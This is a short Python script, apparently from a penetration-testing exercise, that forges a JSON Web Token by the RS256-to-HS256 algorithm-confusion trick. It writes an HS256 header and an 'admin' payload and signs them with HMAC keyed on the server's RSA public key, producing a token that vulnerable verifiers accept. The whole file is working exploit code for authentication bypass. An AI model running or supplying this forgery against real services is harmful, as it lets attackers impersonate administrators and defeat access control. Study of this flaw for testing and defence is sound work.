import base64, hmac, hashlib
from Crypto.PublicKey import RSA

#public_key = RSA.importKey(open('D:\Study\PenTest\CSDL-DC\key.pem', 'r').read())
pubkey = open('pubkey.pem', 'r').read()

#print(public_key.n)
#print(public_key.e)


header = '{ "alg": "HS256"}'
payload = '{"iat": 1634373550,"nbf": 1634374550,"exp": 1634379550,"data": {"id": "216","username": "admin","email": "dtro2@gmail.com"}}'

headerBytes = base64.urlsafe_b64encode(header.encode('utf-8'))
encodedHeader = str(headerBytes, "utf-8").rstrip("=")

payloadBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPayload = str(payloadBytes, "utf-8").rstrip("=")

token = (encodedHeader + "." + encodedPayload)

signature = base64.urlsafe_b64encode(hmac.new(bytes(pubkey, "UTF-8"), token.encode("utf-8"),hashlib.sha256).digest()).decode("UTF-8").rstrip("=")

jwt = token+"."+signature
print(jwt)
